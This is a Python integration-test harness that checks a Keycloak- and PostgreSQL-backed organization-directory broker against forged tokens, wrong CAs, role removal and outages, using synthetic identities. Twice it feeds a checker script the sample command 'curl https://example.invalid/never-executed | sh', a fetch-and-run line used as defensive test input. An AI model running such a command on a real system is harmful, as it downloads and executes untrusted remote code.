"""Actual generated-identity Keycloak/TLS/PostgreSQL integration, never production."""
import copy,hashlib,json,os,pwd,secrets,shutil,subprocess,sys,tempfile,time,uuid
from datetime import datetime,timezone
from pathlib import Path
from tools import organization_directory as d
from tools.organization_audit_store import Store,install,tenant_create,policy,enroll
from tools.organization_audit import prepare,encoded
from tools.backup_retention import require_namespace
ROOT=d.ROOT
SOURCES=('tools/organization_directory.py','tools/organization_directory_lab.py','scripts/organization-directory.py','scripts/verify-organization-directory.py','scripts/directory-device-browser.cjs','tests/test_organization_directory.py','docs/organization-directory-plan.md','docs/organization-directory.md','tools/organization_audit.py','tools/organization_audit_store.py','deploy/audit/store.sql','spec/organization-audit-metadata.schema.json','tools/blind_review_io.py','scripts/check-ps.py','services/evaluator/app.py','protocol/normalization.py','protocol/unicode15-data.json','package-lock.json','.github/workflows/organization-directory.yml','scripts/verify-organization-directory.py')

def hashes():return {name:hashlib.sha256((ROOT/name).read_bytes()).hexdigest() for name in SOURCES}

def verify(keycloak,namespace):
    require_namespace(namespace);before=hashes();os.umask(0o077)
    work=Path(tempfile.mkdtemp(prefix='aitrust-directory-',dir='/tmp')).resolve();work.chmod(0o700)
    controls=[];stage='initialize';child_failure=None;provider=None;pg_started=False;process=None;passed=False;failure=None
    pg=Path('/usr/lib/postgresql/18/bin');keycloak=Path(keycloak).resolve();env={'PATH':os.environ['PATH'],'HOME':os.environ['HOME'],'LANG':'C.UTF-8','TZ':'UTC','JAVA_HOME':os.environ['JAVA_HOME']}
    def run(args,*,raw=None,limit=60):
        nonlocal child_failure
        r=subprocess.run(list(map(str,args)),input=raw,capture_output=True,env=env,timeout=limit)
        if r.returncode:
            try:
                error=json.loads(r.stderr);info=error.get('diagnostics')
                if type(info) is dict and set(info)=={'provider_step','provider_status'}:child_failure=info
            except (ValueError,AttributeError):pass
            raise RuntimeError('Disposable integration subprocess failed')
        return r.stdout
    def write(path,value):path.write_bytes(value if isinstance(value,bytes) else encoded(value));path.chmod(0o600);return path
    def case(name):controls.append({'case':name,'pass':True})
    def refused(fn,name):
        try:fn()
        except Exception:case(name);return
        raise RuntimeError('Required integration refusal missing')
    def cli(*args,raw=None):return json.loads(run([sys.executable,ROOT/'scripts/organization-directory.py','--config',cfg_path,'--diagnostics',*args],raw=raw))
    logfile=None
    try:
        stage='generate_pinned_tls_and_provider_import'
        check_keycloak=keycloak/'bin/kc.sh';d.check(check_keycloak.is_file())
        cert=work/'lab-cert.pem';key=work/'lab-key.pem'
        run(['openssl','req','-x509','-newkey','rsa:2048','-nodes','-keyout',key,'-out',cert,'-days','1','-subj','/CN=127.0.0.1','-addext','subjectAltName=IP:127.0.0.1','-addext','basicConstraints=critical,CA:TRUE']);key.chmod(0o600);cert.chmod(0o600)
        public=run(['openssl','x509','-in',cert,'-pubkey','-noout']);der=run(['openssl','pkey','-pubin','-outform','DER'],raw=public)
        import base64
        spki=base64.b64encode(hashlib.sha256(der).digest()).decode()
        role_groups={op:str(uuid.uuid4()) for op in d.OPS}
        tenant=str(uuid.uuid4());foreign_tenant=str(uuid.uuid4());client_uuid=str(uuid.uuid4());client_secret=secrets.token_urlsafe(32);controller_secret=secrets.token_urlsafe(32)
        people={name:{'id':str(uuid.uuid4()),'password':secrets.token_urlsafe(24)} for name in ['view','export','review','admin','backup','other']}
        roles={name:[d.ROLES[name]] for name in ['view','export','review']};roles.update(admin=[d.ROLES['configure']],backup=[d.ROLES['configure'],d.ROLES['view']],other=[d.ROLES['view']])
        def realm(name):
            identities=people if name=='directory_lab' else {n:{**v,'id':str(uuid.uuid4())} for n,v in people.items()}
            selected_client_uuid=client_uuid if name=='directory_lab' else str(uuid.uuid4())
            selected_groups=role_groups if name=='directory_lab' else {op:str(uuid.uuid4()) for op in d.OPS}
            return {'realm':name,'enabled':True,'sslRequired':'all','loginTheme':'keycloak','accessTokenLifespan':300,'oauth2DeviceCodeLifespan':300,'oauth2DevicePollingInterval':5,'groups':[{'id':selected_groups[op],'name':d.ROLES[op]} for op in d.OPS],'clients':[
             {'id':selected_client_uuid,'clientId':'aitrust-broker','secret':client_secret,'enabled':True,'protocol':'openid-connect','publicClient':False,'defaultClientScopes':['basic','roles','profile','email'],'optionalClientScopes':['kc-admin-api'],'serviceAccountsEnabled':True,'standardFlowEnabled':False,'directAccessGrantsEnabled':False,'attributes':{'oauth2.device.authorization.grant.enabled':'true'},'protocolMappers':[{'name':'broker-audience','protocol':'openid-connect','protocolMapper':'oidc-audience-mapper','config':{'included.client.audience':'aitrust-broker','access.token.claim':'true','id.token.claim':'false'}}]},
             {'clientId':'lab-controller','secret':controller_secret,'enabled':True,'protocol':'openid-connect','publicClient':False,'defaultClientScopes':['basic','roles','profile','email'],'optionalClientScopes':['kc-admin-api'],'serviceAccountsEnabled':True,'standardFlowEnabled':False,'directAccessGrantsEnabled':False}],
             'users':[{'id':v['id'],'username':'lab_'+n,'firstName':'Synthetic','lastName':'Test','email':'lab_'+n+'@example.invalid','enabled':True,'emailVerified':True,'credentials':[{'type':'password','value':v['password'],'temporary':False}],'groups':['/'+r for r in roles[n]]} for n,v in identities.items()]+[
              {'username':'service-account-aitrust-broker','enabled':True,'serviceAccountClientId':'aitrust-broker','clientRoles':{'realm-management':['view-users']}},
              {'username':'service-account-lab-controller','enabled':True,'serviceAccountClientId':'lab-controller','clientRoles':{'realm-management':['manage-users','view-users']}}]}
        imported=keycloak/'data/import';imported.mkdir(parents=True,exist_ok=True);write(imported/'directory_lab-realm.json',realm('directory_lab'))
        # A separate realm proves that a valid foreign issuer's token is refused.
        write(imported/'directory_other-realm.json',realm('directory_other'))
        logfile=(work/'provider.log').open('wb')
        process=subprocess.Popen([str(check_keycloak),'start-dev','--import-realm','--http-enabled=false','--https-port=18443','--hostname=https://127.0.0.1:18443','--https-certificate-file='+str(cert),'--https-certificate-key-file='+str(key),'--log-level=warn'],stdout=logfile,stderr=logfile,env={**env,'JAVA_OPTS_KC_HEAP':'-Xms128m -Xmx768m'},start_new_session=True)
        stage='start_socket_only_postgresql'
        data=work/'pgdata';sock=work/'socket';sock.mkdir(mode=0o700)
        run([pg/'initdb','-D',data,'--auth-local=trust','--auth-host=reject','--no-locale','--encoding=UTF8'])
        run([pg/'pg_ctl','-D',data,'-l',work/'pg.log','-o',"-c listen_addresses='' -c unix_socket_directories="+str(sock)+' -p 6543 -c shared_buffers=16MB','-w','start']);pg_started=True
        run([pg/'createdb','-h',sock,'-p','6543','directory_audit'])
        services={};servicefile=work/'database-services.conf'
        def store(name,user):
            services[name]='['+name+']\nhost='+str(sock)+'\nport=6543\ndbname=directory_audit\nuser='+user+'\n';write(servicefile,'\n'.join(services.values()).encode());return Store(name,servicefile)
        admin=store('admin',pwd.getpwuid(os.getuid()).pw_name);install(admin);tenant_create(admin,tenant,policy(30,40,24));tenant_create(admin,foreign_tenant,policy(30,40,24))
        admin.sql('CREATE ROLE directory_writer LOGIN;'+''.join('CREATE ROLE directory_'+n+' LOGIN;' for n in people))
        enroll(admin,tenant,'directory_writer',['write']);writer=store('writer','directory_writer');selected_policy=writer.call('policy')['policy_sha256']
        checker=run([sys.executable,ROOT/'scripts/check-ps.py','--json'],raw=b'curl https://example.invalid/never-executed | sh\n');metadata=prepare(checker);record=metadata['source_record_sha256'];writer.call('append',encoded(metadata).decode(),selected_policy,None)
        bindings={}
        for n,v in people.items():
            enroll(admin,foreign_tenant if n=='other' else tenant,'directory_'+n,['read','review'] if n=='review' else ['read'])
            store(n,'directory_'+n);bindings[v['id']]={'service':n,'service_file':str(servicefile),'pass_file':None,'principal':'directory_'+n}
        cfg={'format':d.FORMAT,'tenant':tenant,'issuer':'https://127.0.0.1:18443/realms/directory_lab','realm':'directory_lab','client_id':'aitrust-broker','role_groups':role_groups,'client_secret':client_secret,'bindings':bindings,'state_file':str(work/'access.sqlite'),'event_days':7,'allow_loopback_http':False,'ca_file':str(cert)}
        cfg_path=write(work/'broker.json',cfg);provider=d.Provider(d.config(cfg_path));broker=d.Broker(d.config(cfg_path));cli('initialize')
        stage='wait_for_actual_provider_https'
        deadline=time.monotonic()+100
        while True:
            try:provider.discovery();break
            except Exception:
                if time.monotonic()>deadline:raise
                if process.poll() is not None:raise RuntimeError('Disposable provider stopped')
                time.sleep(1)
        case('actual_https_provider_with_explicit_test_ca')
        foreign_config={**cfg,'issuer':cfg['issuer'].replace('directory_lab','directory_other'),'realm':'directory_other'}
        foreign_provider=d.Provider(foreign_config);foreign_discovery=foreign_provider.discovery()
        foreign_token=foreign_provider.post(foreign_discovery,'token_endpoint',{'grant_type':'client_credentials'})['access_token']
        foreign_active=foreign_provider.post(foreign_discovery,'introspection_endpoint',{'token':foreign_token});d.check(foreign_active['active'] is True)
        refused(lambda:broker.dispatch({'tenant':tenant,'operation':'view','token':foreign_token,'arguments':{}}),'valid_foreign_issuer_token_refused')
        untrusted=copy.deepcopy(cfg);untrusted['ca_file']=None;refused(lambda:d.Provider(untrusted).discovery(),'untrusted_tls_certificate_refused')
        wrong_ca=work/'wrong-ca.pem';wrong_key=work/'wrong-key.pem'
        run(['openssl','req','-x509','-newkey','rsa:2048','-nodes','-keyout',wrong_key,'-out',wrong_ca,'-days','1','-subj','/CN=wrong-lab-ca']);wrong_ca.chmod(0o600)
        wrong_trust=copy.deepcopy(cfg);wrong_trust['ca_file']=str(wrong_ca)
        refused(lambda:d.Provider(wrong_trust).discovery(),'wrong_selected_ca_refused')
        def login(n,configuration=cfg):
            p=d.Provider(configuration);pending=p.begin();browser={'synthetic_only':True,'uri':pending['verification_uri'],'code':pending['user_code'],'username':'lab_'+n,'password':people[n]['password'],'spki':spki}
            result=json.loads(run(['node',ROOT/'scripts/directory-device-browser.cjs'],raw=encoded(browser),limit=45));d.check(result['pass'] is True)
            return p.finish_once(pending)
        def req(session,op='view',args=None,selected_tenant=tenant):return {'tenant':selected_tenant,'operation':op,'token':session['access_token'],'arguments':{} if args is None else args}
        stage='real_device_login_and_view_cli'
        # Exercise the actual public CLI as well as the server's callable broker.
        begin_dir=work/'begin';ready=cli('begin','--output',begin_dir)
        run(['node',ROOT/'scripts/directory-device-browser.cjs'],raw=encoded({'synthetic_only':True,'uri':ready['verification_uri'],'code':ready['user_code'],'username':'lab_view','password':people['view']['password'],'spki':spki}),limit=45)
        cli('finish','--pending',begin_dir/'pending.json','--output',work/'session');view=json.loads((work/'session/session.json').read_bytes())
        cli('call','--output',work/'private-view',raw=encoded(req(view)));d.check(json.loads((work/'private-view/result.json').read_bytes())['records'][0]['id']==record);case('actual_device_login_and_private_record_view_cli')
        stage='permission_split_and_real_export_review'
        sessions={'view':view}
        for n in ['export','review','admin','backup','other']:sessions[n]=login(n)
        packet=broker.dispatch(req(sessions['export'],'export'));d.check(packet['header']['tenant']==tenant and len(packet['records'])==1);case('actual_separate_export_permission')
        result=broker.dispatch(req(sessions['review'],'review',{'id':record,'decision':'disagree','reason':'false_alarm'}));case('actual_organization_feedback_review')
        refused(lambda:broker.dispatch(req(view,'export')),'view_does_not_grant_export')
        refused(lambda:broker.dispatch(req(sessions['admin'],'review',{'id':record,'decision':'agree','reason':'supported'})),'configuration_does_not_grant_review')
        refused(lambda:broker.dispatch(req(view,selected_tenant=foreign_tenant)),'cross_tenant_request_refused')
        refused(lambda:broker.dispatch(req(sessions['other'])),'wrong_database_tenant_binding_refused')
        refused(lambda:broker.dispatch(req({'access_token':'invented.invalid.token'})),'forged_token_refused')
        stage='live_directory_role_removal_and_user_disable'
        discovery=provider.discovery();controller=provider.request(discovery['token_endpoint'],{'client_id':'lab-controller','client_secret':controller_secret,'grant_type':'client_credentials','scope':'kc-admin-api'})['access_token']
        # Admin changes are performed by the separate disposable lab controller.
        from urllib.request import Request
        def change(path,method,value):
            url=provider.base+'/admin/realms/directory_lab/'+path;provider.url(url,admin=True)
            raw=encoded(value);r=provider.opener.open(Request(url,data=raw,headers={'Authorization':'Bearer '+controller,'Content-Type':'application/json'},method=method),timeout=5)
            d.check(r.status in (200,204));r.close()
        membership_path='users/'+people['view']['id']+'/groups/'+role_groups['view']
        change(membership_path,'DELETE',{})
        refused(lambda:broker.dispatch(req(view)),'current_directory_role_removal_denies_old_token')
        change(membership_path,'PUT',{});d.check(broker.dispatch(req(view))['records']);case('restored_directory_role_works')
        change('users/'+people['view']['id'],'PUT',{'enabled':False});refused(lambda:broker.dispatch(req(view)),'disabled_directory_user_denied')
        change('users/'+people['view']['id'],'PUT',{'enabled':True})
        stage='local_revoke_restore_and_compromised_admin_recovery'
        target=people['review']['id'];broker.dispatch(req(sessions['admin'],'configure',{'subject':target,'action':'revoke'}))
        refused(lambda:broker.dispatch(req(sessions['review'],'review',{'id':record,'decision':'agree','reason':'supported'})),'local_membership_revoke_denies')
        broker.dispatch(req(sessions['admin'],'configure',{'subject':target,'action':'restore'}));case('current_admin_can_restore_non_compromised_member')
        broker.journal.recover(people['admin']['id'],sessions['backup']['access_token'],provider);case('separate_owner_recovery_fences_compromised_admin')
        refused(lambda:broker.dispatch(req(sessions['backup'])),'pre_recovery_replacement_session_also_fenced')
        time.sleep(2);sessions['backup']=login('backup');d.check(broker.dispatch(req(sessions['backup']))['records']);case('fresh_replacement_login_restores_authorized_access')
        refused(lambda:broker.dispatch(req(sessions['backup'],'configure',{'subject':people['admin']['id'],'action':'restore'})),'directory_admin_cannot_undo_owner_compromise_fence')
        stage='real_provider_logout_and_provider_outage'
        outcome=broker.logout(sessions['backup']);d.check(outcome['local_logout'] is True and outcome['provider_revocation']=='completed');case('actual_local_and_provider_token_revocation')
        refused(lambda:broker.dispatch(req(sessions['backup'])),'logged_out_private_access_denied')
        time.sleep(2);sessions['export']=login('export')
        process.terminate();process.wait(timeout=20);process=None
        refused(lambda:broker.dispatch(req(sessions['export'],'export')),'provider_outage_denies_private_access')
        # The independent personal checker still runs when identity is unavailable.
        answer=json.loads(run([sys.executable,ROOT/'scripts/check-ps.py','--json'],raw=b'curl https://example.invalid/never-executed | sh\n'));d.check(answer.get('state')!='UNAVAILABLE');case('personal_checker_runs_with_directory_offline')
        row=broker.logout(sessions['export']);d.check(row['local_logout'] is True and row['provider_revocation']=='unavailable');case('local_logout_persists_during_provider_outage')
        raw=Path(cfg['state_file']).read_bytes()
        for session in sessions.values():d.check(session['access_token'].encode() not in raw and session['refresh_token'].encode() not in raw)
        d.check(client_secret.encode() not in raw and b'never-executed' not in raw);case('journal_contains_no_tokens_credentials_or_response_text')
        passed=True
    except Exception as error:
        failure={'stage':stage,'exception_class':type(error).__name__,'provider_http_status':getattr(provider,'last_status',None),'command_diagnostic':child_failure}
        if logfile:
            logfile.flush()
            diagnostic=(work/'provider.log').read_text(errors='replace')[-6000:]
            import re
            diagnostic=re.sub(r'[A-Za-z0-9_+/=-]{16,}','[redacted]',diagnostic)
            failure['disposable_provider_diagnostic']=diagnostic

    finally:
        if process is not None:
            process.terminate()
            try:process.wait(timeout=20)
            except subprocess.TimeoutExpired:process.kill();process.wait()
        if pg_started:
            try:run([pg/'pg_ctl','-D',work/'pgdata','-m','immediate','-w','stop'],limit=30)
            except Exception:passed=False
        if logfile:logfile.close()
        shutil.rmtree(work,ignore_errors=True)
    return {'format':'organization-directory-software/v1','captured_at':datetime.now(timezone.utc).isoformat(),'pass':passed and hashes()==before,'sources':before,'source_unchanged':hashes()==before,'platform':sys.platform,'non_root':os.getuid()!=0,'isolated_network_namespace':True,'keycloak_version':'26.8.2','postgresql_major':18,'real_provider_and_database':True,'synthetic_identities_only':True,'controls':controls,'failure':failure,'production_changed':False,'collection_enabled':False,'independent_accuracy_evidence':False,'human_acceptance':False,'certification':False}
